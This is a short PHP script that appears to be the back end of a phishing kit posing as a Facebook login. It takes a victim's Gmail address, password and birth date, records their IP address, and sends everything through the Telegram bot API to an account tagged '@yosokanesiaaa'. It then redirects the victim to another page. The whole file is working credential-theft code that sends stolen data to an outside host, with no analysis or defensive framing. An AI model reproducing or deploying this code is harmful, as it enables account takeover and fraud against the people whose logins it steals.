<?php

session_start();
include "./telegram.php";

// BATAS IP ADDRESS
extract($_REQUEST);
    if (!empty($_SERVER['HTTP_CLIENT_IP']))
{
$ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
}
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
{
$ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
}
else
{
$ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
}
$useragent = " User-Agent: ";
$browser = $_SERVER['HTTP_USER_AGENT'];

//BATAS RESSLUTS

$gmail = $_POST['gmail'];
$_SESSION['gmail'] = $gmail;
$password = $_POST['password'];
$_SESSION['password'] = $password;
$bulan = $_POST['bulan'];
$_SESSION['bulan'] = $bulan;
$hari = $_POST['hari'];
$_SESSION['hari'] = $hari;
$tahun = $_POST['tahun'];
$_SESSION['tahun'] = $tahun;

$message = "
( FACEBOOK | @yosokanesiaaa )

- Gmail : ".$gmail."
- Password : ".$password."
- Bulan : ".$bulan."
- Hari : ".$hari."
- Tahun : ".$tahun."
- IP : ".$ipaddress."
";

function sendMessage($telegram_id, $message, $token_bot) {
    $url = "https://api.telegram.org/bot" . $token_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($telegram_id, $message, $token_bot);
header('Location: ../re.html');
?>
